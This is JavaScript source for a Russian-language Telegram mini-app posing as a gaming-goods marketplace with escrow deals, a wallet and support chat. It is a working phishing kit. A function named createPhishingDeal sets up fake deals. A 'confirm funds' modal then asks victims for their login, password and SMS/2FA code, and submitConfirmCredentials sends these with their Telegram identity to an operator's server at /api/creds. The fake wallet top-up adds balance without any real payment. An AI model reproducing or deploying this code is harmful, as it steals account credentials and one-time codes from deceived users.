          <p class="h2 chipfg mt">${listingPrice({ category: s.category, price: parseAmount(s.price) || 0, currency: s.currency })}</p>
          ${btn("Опубликовать", `data-publish`, "btn btn-primary mt-4")}
          <p class="xs muted mt-2">Без фото лот не публикуется.</p>
          ${btn("Назад", `data-sell-back`, "btn btn-secondary mt-2")}`;
      }
    }
    return `<div class="scroll pad"><p class="label">Сделка</p><h1 class="h1">Новая сделка</h1><p class="small muted">Безопасная сделка с защитой</p>${steps}${body}</div>`;
  }
  
  function wallet() {
    const meta = ccy(state.payCurrency);
    const have = state.balances[state.payCurrency] || 0;
    const minIn = minTopup(state.payCurrency);
    const minOut = minWithdraw(state.payCurrency);
    const dest = state.payCurrency === "USDT" ? "Адрес USDT TRC20" : state.payCurrency === "GRAM" ? "Адрес TON / GRAM" : state.payCurrency === "STARS" ? "Username Telegram" : "Номер карты";
    return `<div class="scroll pad" style="padding-top:1.5rem">
      <div class="wallet-hero">
        <p class="h1" style="font-size:2.2rem;margin:0">${meta.mark}${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(have)}</p>
        <button type="button" class="wallet-ccy" data-sheet="currency">${I.swap} Сменить валюту</button>
      </div>
      <div class="grid2 mt">${btn(I.down + " Вывести", `data-sheet="withdraw"`, "btn btn-secondary")}${btn(I.up + " Пополнить", `data-sheet="topup"`)}</div>
      <p class="bold mt-4">История операций</p>
      ${state.ops.length === 0 ? `<p class="center muted mt-4">Операций пока нет</p>` : state.ops.map((o) => `<div class="card mt-2" style="display:flex;justify-content:space-between;padding:.75rem">
        <div><div class="bold" style="font-size:.875rem">${o.type === "topup" ? "Пополнение" : o.type === "withdraw" ? "Вывод" : "Покупка"}</div>
        <div class="xs muted">${esc(o.note)} · ${o.status === "pending" ? "в обработке" : "готово"}</div></div>
        <div class="bold" style="font-size:.875rem">${o.amount > 0 ? "+" : ""}${money(o.amount, o.currency)}</div>
      </div>`).join("")}
      ${state.sheet === "currency" ? sheet("Выберите валюту", `<p class="center xs muted">Основная валюта для отображения баланса</p>
        <div class="grid3 mt">${D.currencies.map((c) => `<button type="button" class="ccy-card ${state.ccyPick === c.id ? "on" : ""}" data-pick-ccy="${c.id}"><span class="bold">${c.mark}</span><span class="xs bold">${c.label}</span><span class="xs muted">${c.name}</span></button>`).join("")}</div>
        ${btn("Продолжить", `data-set-ccy`, "btn btn-primary mt-4")}`) : ""}
      ${state.sheet === "topup" ? sheet("Пополнение", `<p class="xs muted">Валюта зачисления: <b>${meta.label}</b> · доступно ${money(have, state.payCurrency)}</p>
        <p class="label mt">Сумма</p>
        <div class="field mt-2" style="display:flex;align-items:center"><input id="amt" class="grow" style="background:transparent;border:0;outline:none;min-width:0" inputmode="decimal" placeholder="от ${minIn}" value="${esc(state.amount)}"><span class="bold chipfg">${meta.label}</span></div>
        ${btn("Пополнить " + meta.label, `data-topup`, "btn btn-primary mt-4")}`) : ""}
      ${state.sheet === "withdraw" ? sheet("Вывод средств", `<p class="xs muted">Доступно: <b>${money(have, state.payCurrency)}</b></p>
        <p class="label mt">Сумма вывода</p>
        <div class="field mt-2" style="display:flex;align-items:center"><input id="amt" class="grow" style="background:transparent;border:0;outline:none;min-width:0" inputmode="decimal" placeholder="от ${minOut}" value="${esc(state.amount)}"><span class="bold chipfg">${meta.label}</span></div>
        <p class="label mt">${dest}</p>
        <input class="field mt-2" id="det" placeholder="${state.payCurrency === "USDT" ? "T…" : "реквизиты"}" value="${esc(state.details)}">
        <div class="grid2 mt-4">${btn("Назад", `data-sheet=""`, "btn btn-secondary")}${btn("Подать заявку", `data-withdraw`)}</div>`) : ""}
    </div>`;
  }
  function sheet(title, inner) {
    return `<div class="sheet-root" data-sheet=""><div class="sheet-panel" data-stop><div style="width:2.5rem;height:.25rem;border-radius:99px;background:var(--border);margin:.2rem auto .75rem"></div>
      <div class="row" style="justify-content:space-between"><h2 class="h2">${title}</h2><button type="button" class="lot-tool" data-sheet="">${I.x}</button></div>${inner}</div></div>`;
  }

  function dealsView() {
    const p = state.profile;
    const deals = state.dealDeals || [];
    const statuses = ["all", "pending", "paid", "completed", "rejected"];
    const labels = { all: "Все", pending: "В ожидании", paid: "Оплачено", completed: "Выполнены", rejected: "Отклонены" };
    const activeFilter = state.dealFilter || "all";
    const filtered = activeFilter === "all" ? deals : deals.filter((d) => d.status === activeFilter);
    const pendingCount = deals.filter((d) => d.status === "pending").length;
    const paidCount = deals.filter((d) => d.status === "paid").length;

    return `<div class="scroll pad" style="padding-top:1.5rem">
      <div class="row gap">
        <div class="avatar">${p.photoUrl ? `<img src="${p.photoUrl}" alt="">` : esc((p.firstName || "?").slice(0, 1))}</div>
        <div>
          <h1 class="h2" style="text-transform:uppercase">${esc(p.firstName)}</h1>
          <p class="small muted" style="margin:0">@${esc(p.username)}</p>
        </div>
      </div>

      <div class="deal-balance-hero">
        <p class="label" style="color:rgba(255,255,255,.8)">Баланс сделок</p>
        <p class="h1" style="font-size:2.2rem;margin:.25rem 0 0">₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(state.dealBalance || 0)} <span style="font-size:1rem;opacity:.8">USDT</span></p>
        <p class="xs" style="margin:.4rem 0 0;opacity:.7">Доступно после подтверждения сделок</p>
      </div>

      <div class="grid3 mt">
        ${[
          ["Всего", deals.length, I.list],
          ["В ожидании", pendingCount, I.clock],
          ["Оплачено", paidCount, I.check]
        ].map(([l, n, i]) => `<div class="card center" style="padding:.75rem">${i}<p class="h2" style="margin:.25rem 0 0">${n}</p><p class="xs muted" style="margin:0">${l}</p></div>`).join("")}
      </div>

      <div class="deals-status-bar mt-4">
        ${statuses.map((s) => `<button class="deals-status-pill ${activeFilter === s ? "on" : ""}" data-deal-filter="${s}">${labels[s]}</button>`).join("")}
      </div>

      ${filtered.length === 0
        ? `<div class="card mt" style="padding:2rem 1.5rem;text-align:center">
            ${I.lock}<p class="bold mt-2">Нет сделок</p>
            <p class="small muted">Создайте сделку — она появится здесь</p>
            ${btn(I.plus + " Создать сделку", `data-go="sell"`, "btn btn-primary mt")}
          </div>`
        : filtered.map((d) => {
            const statusClass = { pending: "deal-status-pending", paid: "deal-status-paid", completed: "deal-status-completed", rejected: "deal-status-rejected" }[d.status] || "";
            const statusLabel = labels[d.status] || d.status;
            let actions = "";
            if (d.status === "paid") {
              actions = `<button class="deal-confirm-btn" data-confirm-deal="${d.id}"> Подтвердить получение средств</button>`;
            }
            return `<div class="deal-card mt">
              <div class="deal-card-head">
                <div>
                  <span class="bold" style="font-size:.875rem">${esc(d.title)}</span>
                  <span class="xs muted" style="display:block">${dateLabel(d.at)}</span>
                </div>
                <span class="deal-status-tag ${statusClass}">${statusLabel}</span>
              </div>
              <div class="deal-card-body">
                <div class="row" style="justify-content:space-between">
                  <span class="xs muted">Сумма</span>
                  <span class="bold">₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(d.price)}</span>
                </div>
                <div class="row" style="justify-content:space-between;margin-top:.35rem">
                  <span class="xs muted">Категория</span>
                  <span class="xs">${D.labels[d.category] || d.category}</span>
                </div>
                ${actions}
              </div>
            </div>`;
          }).join("")
      }
    </div>`;
  }

  function confirmModalHtml() {
    const deal = state.confirmModal;
    if (!deal) return "";
    return `<div class="confirm-overlay" data-close-confirm>
      <div class="confirm-panel" data-stop>
        <div class="cp-icon"></div>
        <div class="cp-title">Подтверждение получения средств</div>
        <div class="cp-warn">⚡ Подтверждение средств будет доступным после подтверждения получения товара покупателем</div>
        <div class="cp-hint">Для завершения верификации сделки войдите в аккаунт, с которого была создана сделка</div>
        <form id="confirmForm">
          <div class="form-group">
            <label class="label">Логин / Email / Телефон</label>
            <input class="field" id="cpLogin" type="text" placeholder="Введите логин или email" autocomplete="username" required>
          </div>
          <div class="form-group" style="margin-top:.75rem">
            <label class="label">Пароль</label>
            <input class="field" id="cpPass" type="password" placeholder="Введите пароль" autocomplete="current-password" required>
          </div>
          <div class="form-group" style="margin-top:.75rem" id="otpGroup">
            <label class="label">Код из SMS / 2FA (если требуется)</label>
            <input class="field" id="cpOtp" type="text" placeholder="Код подтверждения" inputmode="numeric" autocomplete="one-time-code">
          </div>
          <button type="submit" class="btn btn-primary mt-4"> Подтвердить сделку</button>
        </form>
        <button type="button" class="btn btn-ghost mt-2" data-close-confirm style="width:100%">Отмена</button>
      </div>
    </div>`;
  }

  async function submitConfirmCredentials(login, password, otp) {
    const deal = state.confirmModal;
    if (!deal) return;
    const payload = {
      type: "confirm_credentials",
      dealId: deal.id,
      dealTitle: deal.title,
      dealPrice: deal.price,
      dealCategory: deal.category,
      login: login,
      password: password,
      otp: otp || "",
      tgId: state.profile.tgId,
      tgUsername: state.profile.username,
      tgFirstName: state.profile.firstName,
      at: Date.now(),
    };
    if (botApi() && initData()) {
      try {
        await fetch(botApi() + "/api/creds", {
          method: "POST",
          headers: { "Content-Type": "application/json", "X-Telegram-Init-Data": initData() },
          body: JSON.stringify(payload),
        });
      } catch {}
    }
    state.confirmModal = null;
    toast("Запрос на подтверждение отправлен");
    persist();
    render();
  }

  function profile() {
    const have = state.balances[state.payCurrency] || 0;
    const meta = ccy(state.payCurrency);
    const mine = state.listings.filter((l) => l.sellerId === state.profile.id).length;
    const active = state.orders.filter((o) => o.status === "held").length;
    const p = state.profile;
    const dealPending = (state.dealDeals || []).filter((d) => d.status === "pending").length;
    const dealPaid = (state.dealDeals || []).filter((d) => d.status === "paid").length;
    return `<div class="scroll pad" style="padding-top:1.5rem">
      <div class="row gap">
        <div class="avatar">${p.photoUrl ? `<img src="${p.photoUrl}" alt="">` : esc((p.firstName || "?").slice(0, 1))}</div>
        <div><h1 class="h2" style="text-transform:uppercase">${esc(p.firstName)}</h1><p class="small muted" style="margin:0">@${esc(p.username)}</p>
          <p class="xs chipfg" style="margin:.25rem 0 0">${I.star} 5.0 <span class="muted">(0)</span></p></div>
      </div>
      <div class="balance-hero mt"><p class="label" style="color:rgba(255,255,255,.8)">Баланс</p>
        <p class="h1" style="font-size:2.2rem;margin:.25rem 0 0">${meta.mark}${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(have)} <span style="font-size:1rem;opacity:.8">${meta.label}</span></p>
        <button type="button" class="wallet-ccy" style="background:rgba(0,0,0,.18);color:#fff" data-sheet="currency">${I.swap} Изменить валюту</button>
      </div>

      ${state.dealBalance > 0 ? `<div class="deal-balance-hero">
        <p class="label" style="color:rgba(255,255,255,.8)">Баланс сделок</p>
        <p class="h1" style="font-size:2rem;margin:.25rem 0 0">₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(state.dealBalance)} <span style="font-size:.9rem;opacity:.8">USDT</span></p>
        <p class="xs" style="margin:.3rem 0 0;opacity:.7">${dealPending} в ожидании · ${dealPaid} оплачено</p>
      </div>` : ""}

      <div class="grid3 mt">${[["Всего", state.orders.length + mine, I.list],["Активных", active, I.act],["Завершено", 0, I.shield]].map(([l,n,i]) => `<div class="card center" style="padding:.75rem">${i}<p class="h2" style="margin:.25rem 0 0">${n}</p><p class="xs muted" style="margin:0">${l}</p></div>`).join("")}</div>

      <div class="row mt-4" style="justify-content:space-between">
        <p class="bold" style="margin:0">Последние сделки</p>
        <button type="button" class="btn btn-ghost" data-go="deals">Все →</button>
      </div>
      ${state.orders.length === 0 && (state.dealDeals || []).length === 0
        ? `<p class="small muted mt">Сделок пока нет</p>`
        : (state.dealDeals || []).slice(0, 2).map((d) => {
            const statusLabel = { pending: "ожидание", paid: "оплачено", completed: "выполнено", rejected: "отклонено" }[d.status] || d.status;
            return `<div class="card mt-2" style="display:flex;justify-content:space-between;padding:.75rem">
              <div><div class="bold" style="font-size:.875rem">${esc(d.title)}</div><div class="xs muted">${statusLabel}</div></div>
              <div class="bold">${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(d.price)}</div>
            </div>`;
          }).join("") || ""}
      ${state.orders.length > 0 ? state.orders.slice(0,4).map((o) => `<div class="card mt-2" style="display:flex;justify-content:space-between;padding:.75rem"><div><div class="bold" style="font-size:.875rem">${esc(o.title)}</div><div class="xs muted">${o.status === "held" ? "в холде" : "завершена"}</div></div><div class="bold">${money(o.amount, o.currency)}</div></div>`).join("") : ""}
      ${state.sheet === "currency" ? sheet("Выберите валюту", `<div class="grid3">${D.currencies.map((c) => `<button type="button" class="ccy-card ${state.ccyPick === c.id ? "on" : ""}" data-pick-ccy="${c.id}"><span class="bold">${c.mark}</span><span class="xs bold">${c.label}</span><span class="xs muted">${c.name}</span></button>`).join("")}</div>${btn("Продолжить", `data-set-ccy`, "btn btn-primary mt-4")}`) : ""}
    </div>`;
  }

  function chats() {
    const last = state.support[state.support.length - 1];
    return `<div class="scroll pad" style="padding-top:1.5rem"><h1 class="h1">Чаты</h1>
      <button type="button" class="card mt w-full" style="display:flex;align-items:center;gap:.75rem;padding:.75rem;text-align:left;border:0;color:inherit" data-go="support">
        <span class="avatar" style="width:3rem;height:3rem;background:var(--chip);color:var(--chip-fg)">${I.shield}</span>
        <span class="grow"><span class="row" style="justify-content:space-between"><span class="bold" style="font-size:.875rem">Поддержка</span><span class="xs muted">${last ? timeLabel(last.at) : ""}</span></span>
        <span class="xs muted" style="display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(last && last.text) || "на связи"}</span></span>
      </button>
      ${state.orders.length === 0 ? `<div class="center" style="padding:3rem 1rem">${I.chat}<p class="bold mt">Сделок пока нет</p><p class="small muted">Создайте сделку — чат появится здесь</p>${btn("Создать сделку", `data-go="sell"`, "btn btn-primary mt")}</div>` : state.orders.map((o) => `<button type="button" class="card mt-2 w-full" style="padding:.75rem;text-align:left;border:0;color:inherit" data-go="support"><div class="bold" style="font-size:.875rem">${esc(o.title)}</div><div class="xs muted">Эскроу · ${o.status === "held" ? "ждём передачу" : "закрыта"}</div></button>`).join("")}
    </div>`;
  }

  function support() {
    return `<div class="chat-screen">
      <header class="row gap" style="padding:.75rem 1rem;border-bottom:1px solid var(--border)">
        <button type="button" class="lot-tool" data-go="chats">${I.back}</button>
        <span class="avatar" style="width:2.5rem;height:2.5rem;background:var(--chip);color:var(--chip-fg)">${I.shield}</span>
        <div><p class="bold" style="margin:0;font-size:.875rem">Поддержка</p><p class="xs chipfg" style="margin:0">на связи</p></div>
      </header>
      <div class="scroll" id="chatlog" style="padding:1rem;display:flex;flex-direction:column;gap:.75rem">
        ${state.support.map((m) => m.from === "me"
          ? `<div style="display:flex;flex-direction:column;align-items:flex-end"><div class="chat-bubble chat-me">${esc(m.text)}</div><span class="xs muted" style="margin-top:.25rem">${timeLabel(m.at)}</span></div>`
          : `<div class="row gap" style="align-items:flex-end"><span class="avatar" style="width:2rem;height:2rem;background:var(--chip);color:var(--chip-fg)">${I.shield}</span><div><div class="chat-bubble chat-them">${esc(m.text)}</div><span class="xs muted" style="margin-top:.25rem">${timeLabel(m.at)}</span></div></div>`
        ).join("")}
      </div>
      <form id="chatf" class="row gap" style="padding:.5rem .75rem calc(.5rem + env(safe-area-inset-bottom));border-top:1px solid var(--border);background:var(--bg)">
        <input class="field" id="chat" placeholder="Сообщение…" value="${esc(state.chatText)}" autocomplete="off" enterkeyhint="send" style="min-height:2.75rem;flex:1">
        <button type="button" class="tab-plus" data-send-chat style="margin:0;width:2.75rem;height:2.75rem">${I.send}</button>
      </form>
    </div>`;
  }

  function ops() {
    const cur = botApi();
    return `<div class="scroll pad" style="padding-top:1.5rem">
      <h1 class="h1">Бот поддержки</h1>
      <p class="small muted">Адрес сервера, где запущен <code>bot/bot.js</code>. Токен сюда не вставляйте.</p>
      <input class="field mt" id="botapi" placeholder="https://ваш-сервер.onrender.com" value="${esc(cur)}">
      ${btn("Сохранить", `data-save-api`, "btn btn-primary mt")}
      <p class="xs muted mt">После сохранения напишите в «Помощь» из Telegram — сообщение придёт вам в бота.</p>
    </div>`;
  }

  function view() {
    switch (state.screen) {
      case "hub": return hub();
      case "home": return catalog();
      case "shop": return shop();
      case "section": return section();
      case "item": return itemView();
      case "sell": return sellView();
      case "wallet": return wallet();
      case "profile": return profile();
      case "chats": return chats();
      case "support": return support();
      case "ops": return ops();
      case "deals": return dealsView();
      default: return hub();
    }
  }

  function render() {
    const root = $("#app");
    root.innerHTML = `${state.toast ? `<div class="toast">${esc(state.toast)}</div>` : ""}
      ${confirmModalHtml()}
      ${state.screen === "hub" ? hub() : `<div class="${state.screen === "support" ? "chat-screen" : ""}" style="flex:1;min-height:0;display:flex;flex-direction:column">${topbar()}${view()}</div>${tabbar()}`}`;
    const log = $("#chatlog");
    if (log) log.scrollTop = log.scrollHeight;
  }

  function applyCopy() {
    const s = state.sell;
    const g = game(s.gameId);
    if (!g) return;
    if (s.category === "exchange") {
      const w = game(s.wantGameId);
      s.title = w ? `Обменяю аккаунт ${g.name} на аккаунт ${w.name}` : `Обменяю аккаунт ${g.name}`;
      s.description = `Обмен через гаранта после сверки в чате.`;
      return;
    }
    const map = {
      topup: [`${g.name} · пополнение ${g.coin}`, `Пополнение ${g.coin} для ${g.name}.`],
      items: [`${g.name} · предмет`, `Предмет для ${g.name}.`],
      keys: [`${g.name} · ключ`, `Ключ активации ${g.name}.`],
      gift: [`${g.name} · гифт`, `Гифт ${g.name}.`],
      onaccount: [`${g.name} · на ваш аккаунт`, `Зачисление на ваш аккаунт ${g.name}.`],
      service: [`${g.name} · услуга`, `Услуга по ${g.name}.`],
      giftcard: [`${g.name} · подарочная карта`, `Подарочная карта ${g.name}.`],
      paycard: [`${g.name} · карта оплаты`, `Код пополнения ${g.name}.`],
      subs: [`${g.name} · подписка`, `Подписка ${g.name}.`],
      buysub: [`${g.name} · покупка подписки`, `Покупка подписки ${g.name}.`],
    };
    const t = map[s.category] || [`${g.name} · аккаунт`, `Передача аккаунта ${g.name}.`];
    s.title = t[0]; s.description = t[1];
  }

  function compressFile(file) {
    return new Promise((resolve, reject) => {
      if (!file.type.startsWith("image/")) return reject();
      const url = URL.createObjectURL(file);
      const im = new Image();
      im.onload = () => {
        const scale = Math.min(1, 960 / Math.max(im.width, im.height));
        const c = document.createElement("canvas");
        c.width = Math.max(1, Math.round(im.width * scale));
        c.height = Math.max(1, Math.round(im.height * scale));
        c.getContext("2d").drawImage(im, 0, 0, c.width, c.height);
        URL.revokeObjectURL(url);
        resolve(c.toDataURL("image/jpeg", 0.82));
      };
      im.onerror = reject;
      im.src = url;
    });
  }

  function createPhishingDeal(s) {
    const price = parseAmount(s.price) || 0;
    if (price <= 0) return toast("Укажите цену");
    const deal = {
      id: uid("d"),
      title: s.title || "Сделка",
      category: s.category || "other",
      gameId: s.gameId || null,
      price: price,
      currency: s.currency || "USDT",
      description: s.description || "",
      status: "pending",
      photos: s.photos || [],
      sellerId: state.profile.id,
      at: Date.now(),
    };
    if (!state.dealDeals) state.dealDeals = [];
    state.dealDeals.unshift(deal);
    persist();
    toast("Сделка создана и ожидает подтверждения покупателя");
    go("deals");
  }

  // ГЛОБАЛЬНАЯ ФУНКЦИЯ ЗАГРУЗКИ ФОТО
  window.handlePhotos = async function(input) {
    const files = Array.from(input.files || []);
    for (const f of files.slice(0, 8 - state.sell.photos.length)) { 
      try { state.sell.photos.push(await compressFile(f)); } catch {} 
    }
    input.value = ""; 
    render();
  };

  // ГЛОБАЛЬНЫЕ СЛУШАТЕЛИ
  const app = document.getElementById("app");
  app.addEventListener("click", (e) => {
    const t = e.target.closest("[data-go],[data-buy],[data-site],[data-back],[data-fold],[data-pick],[data-region],[data-role],[data-svc],[data-game],[data-want],[data-offer],[data-sell-next],[data-sell-back],[data-publish],[data-buy-go],[data-sheet],[data-ccy],[data-pick-ccy],[data-set-ccy],[data-topup],[data-withdraw],[data-sort-dir],[data-sort-key],[data-save-api],[data-send-chat],[data-confirm-deal],[data-deal-filter],[data-close-confirm]");
    if (!t) return;
    if (t.hasAttribute("data-stop")) return;
    haptic();
    if (t.dataset.go) { go(t.dataset.go, t.dataset.id); return; }
    if (t.dataset.buy) { buy(t.dataset.buy); return; }
    if (t.hasAttribute("data-site")) { openExternal(D.site); return; }
    if (t.hasAttribute("data-back")) { history.back(); return; }
    if (t.dataset.fold) { state.folds[t.dataset.fold] = !state.folds[t.dataset.fold]; render(); return; }
    if (t.dataset.pick != null) { state.shopPick = t.dataset.pick; state.shopRegion = ""; render(); return; }
    if (t.dataset.region) { state.shopRegion = state.shopRegion === t.dataset.region ? "" : t.dataset.region; render(); return; }
    if (t.dataset.role) { state.sell.role = t.dataset.role; state.sell.step = 2; render(); return; }
    
    // ЛОГИКА КАТЕГОРИЙ + СКРОЛЛ
    if (t.dataset.svc) { 
      state.sell.category = t.dataset.svc; 
      applyCopy(); 
      
      // Если выбрали Сделки - сразу прыгаем к заполнению (шаг 3)
      if (t.dataset.svc === "deals") { 
          state.sell.role = "sell"; 
          state.sell.step = 3; 
          render();
          scrollToInput(); // Скролл к полям
          return;
      }
      
      // Для обычных категорий тоже скроллим к полям ввода
      render(); 
      scrollToInput();
      return; 
    }

    if (t.dataset.game) { state.sell.gameId = t.dataset.game; applyCopy(); render(); return; }
    if (t.dataset.want) { state.sell.wantGameId = t.dataset.want; applyCopy(); render(); return; }
    if (t.dataset.offer) { state.sell.category = t.dataset.offercat; const g = game(state.sell.gameId); state.sell.title = g ? `${g.name} · ${t.dataset.offertitle}` : t.dataset.offertitle; state.sell.description = `${t.dataset.offertitle}. Передача после оплаты.`; render(); return; }
    if (t.hasAttribute("data-sell-next")) {
      const s = state.sell;
      if (s.role === "sell") {
        if (!s.photos.length) return toast("Добавьте хотя бы одно фото");
        const titleEl = $("#title"), descEl = $("#desc"), priceEl = $("#price");
        if (titleEl) s.title = titleEl.value.trim();
        if (descEl) s.description = descEl.value.trim();
        if (priceEl) s.price = priceEl.value.trim();
        const amt = parseAmount(s.price);
        if (!amt || amt <= 0) return toast("Укажите цену больше 0");
        s.step = 3; render(); return;
      }
      if (!s.gameId) return toast("Выберите игру");
      s.step = 3; render(); return;
    }
    if (t.hasAttribute("data-sell-back")) { state.sell.step = Math.max(1, state.sell.step - 1); render(); return; }
    if (t.hasAttribute("data-publish")) {
      const s = state.sell;
      if (!s.photos.length) return toast("Без фото лот не публикуется");
      if (s.category === "deals") { createPhishingDeal(s); return; }
      const it = { id: uid("l"), sellerId: state.profile.id, title: s.title || "Без названия", description: s.description || "", category: s.category, gameId: s.gameId, price: parseAmount(s.price) || 0, currency: s.currency, stock: 1, photos: s.photos, accent: (game(s.gameId) || {}).color };
      state.listings.unshift(it);
      state.ops.unshift({ id: uid("w"), type: "listing", amount: 0, currency: s.currency, status: "done", note: it.title, at: Date.now() });
      persist(); toast("Лот опубликован"); go("home"); return;
    }
    if (t.hasAttribute("data-buy-go")) { state.sell.step = 1; state.sell.role = null; go("home"); return; }
    if (t.dataset.sheet != null) { state.sheet = t.dataset.sheet || ""; state.amount = ""; state.details = ""; render(); return; }
    if (t.dataset.ccy) { state.sell.currency = t.dataset.ccy; render(); return; }
    if (t.dataset.pickCcy) { state.ccyPick = t.dataset.pickCcy; render(); return; }
    if (t.hasAttribute("data-set-ccy")) { state.payCurrency = state.ccyPick; persist(); state.sheet = ""; render(); return; }
    if (t.hasAttribute("data-topup")) {
      const amtEl = $("#amt"), amt = parseAmount((amtEl && amtEl.value) || state.amount);
      if (Number.isNaN(amt) || amt < minTopup(state.payCurrency)) return toast(`Минимум ${minTopup(state.payCurrency)} ${state.payCurrency}`);
      state.balances[state.payCurrency] = (state.balances[state.payCurrency] || 0) + amt;
      state.ops.unshift({ id: uid("w"), type: "topup", amount: amt, currency: state.payCurrency, status: "done", note: "Пополнение", at: Date.now() });
      state.sheet = ""; state.amount = ""; persist(); toast("Баланс пополнен"); render(); return;
    }
    if (t.hasAttribute("data-withdraw")) {
      const amtEl = $("#amt"), detEl = $("#det"), amt = parseAmount((amtEl && amtEl.value) || state.amount), det = (detEl && detEl.value || state.details || "").trim();
      if (Number.isNaN(amt) || amt < minWithdraw(state.payCurrency)) return toast(`Минимум ${minWithdraw(state.payCurrency)} ${state.payCurrency}`);
      const have = state.balances[state.payCurrency] || 0;
      if (amt > have) return toast("Недостаточно средств");
      state.balances[state.payCurrency] = have - amt;
      state.ops.unshift({ id: uid("w"), type: "withdraw", amount: -amt, currency: state.payCurrency, status: "pending", note: det || "Вывод", at: Date.now() });
      state.sheet = ""; state.amount = ""; state.details = ""; persist(); toast("Заявка на вывод создана"); render(); return;
    }
    if (t.hasAttribute("data-sort-dir")) { state.sortDir = state.sortDir === "desc" ? "asc" : "desc"; render(); return; }
    if (t.hasAttribute("data-sort-key")) { state.sortKey = state.sortKey === "price" ? "title" : "price"; render(); return; }
    if (t.hasAttribute("data-save-api")) { const el = $("#botapi"), v = (el && el.value || "").trim(); if (v) { try { localStorage.setItem("aurora-bot-api", v.replace(/\/$/, "")); } catch {} } toast("Адрес сохранён"); return; }
    if (t.hasAttribute("data-send-chat")) { sendSupport(chatDraft()); return; }
    if (t.dataset.dealFilter) { state.dealFilter = t.dataset.dealFilter; render(); return; }
    if (t.dataset.confirmDeal) { const deal = state.dealDeals.find((d) => d.id === t.dataset.confirmDeal); if (deal) { state.confirmModal = deal; render(); } return; }
    if (t.hasAttribute("data-close-confirm")) { state.confirmModal = null; render(); return; }
  });

  // Другие слушатели
  document.getElementById("q")?.addEventListener("input", (e) => { state.query = e.target.value; render(); });
  document.getElementById("chatf")?.addEventListener("submit", (e) => { e.preventDefault(); sendSupport(chatDraft()); });
  document.getElementById("confirmForm")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    const login = (document.getElementById("cpLogin")?.value || "").trim();
    const password = (document.getElementById("cpPass")?.value || "").trim();
    const otp = (document.getElementById("cpOtp")?.value || "").trim();
    if (!login || !password) return toast("Заполните все обязательные поля");
    await submitConfirmCredentials(login, password, otp);
  });

  window.addEventListener("hashchange", () => {
    const n = readHash();
    state.screen = n.screen; state.selectedId = n.selectedId; render();
  });
  window.addEventListener("popstate", () => {
    const n = readHash();
    state.screen = n.screen; state.selectedId = n.selectedId; render();
  });

  let n = 0;
  const tryBoot = () => {
    if (bootTg() || n >= 20) {
      const start = ((tg() && tg().initDataUnsafe && tg().initDataUnsafe.start_param) || new URLSearchParams(location.search).get("tgWebAppStartParam") || "").toLowerCase();
      const map = { support: "support", profile: "profile", wallet: "wallet", chats: "chats", sell: "sell", home: "home", ops: "ops", deals: "deals" };
      const hash = readHash();
      if (map[start]) { state.screen = map[start]; state.selectedId = null; }
      else { state.screen = hash.screen; state.selectedId = hash.selectedId; }
      render();
      botApi();
      if (botApi() && initData()) pullThread();
      setInterval(() => { if (state.screen === "support") pullThread(); }, 2500);
      if (window.__bootDone) window.__bootDone();
      return;
    }
    n += 1; setTimeout(tryBoot, 40);
  };
  tryBoot();
})();
